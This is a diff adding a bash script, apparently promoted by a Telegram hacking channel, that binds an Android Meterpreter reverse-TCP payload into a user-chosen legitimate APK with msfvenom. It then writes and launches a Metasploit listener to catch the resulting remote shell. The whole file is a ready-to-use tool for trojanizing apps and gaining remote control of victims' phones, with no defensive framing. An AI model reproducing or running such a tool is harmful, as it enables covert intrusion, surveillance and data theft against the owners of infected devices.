@@ -1,0 +1,51 @@
+#!/bin/bash
+clear='\033[0m'
+IBlack='\033[0;90m'
+IRed='\033[0;91m'
+IGreen='\033[0;92m'
+IYellow='\033[0;93m'
+IBlue='\033[0;94m'
+IPurple='\033[0;95m'
+ICyan='\033[0;96m'
+IWhite='\033[0;97m'
+echo
+echo
+echo -e "${IWhite}// ${IGreen}JOIN FOR MORE${clear} ${IYellow}t.me/efxtv${clear} ${IWhite}//${clear}"
+
+echo -en "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Please enter LHOST: ${IYellow}"
+read lhost
+
+echo -en "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Please enter LPORT: ${IYellow}"
+read lport
+
+echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} List of apps   PWD ${IYellow}"
+ls $PWD|grep apk|sed 's#^#\t[+] #g'
+
+echo -en "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} App U want to bind: ${IYellow}"
+read $app
+
+echo -en "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Enter output app n: ${IYellow}"
+read op
+
+echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Generating payload "
+echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Please wait... "
+sleep 3
+
+msfvenom -x $app -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $op
+
+echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Payload generated... "
+echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Starting please wait... "
+echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Copy $op to sdcard [cp $op /sdcard/] "
+echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Starting metasploit listener... "
+sleep 3
+
+echo -e "# msfconsole -q -r 'export.rc'
+# nano export.r
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT $lport
+set ExitOnSession false
+set EnableStageEncoding true
+run -j" >export.rc
+msfconsole -q -r 'export.rc'
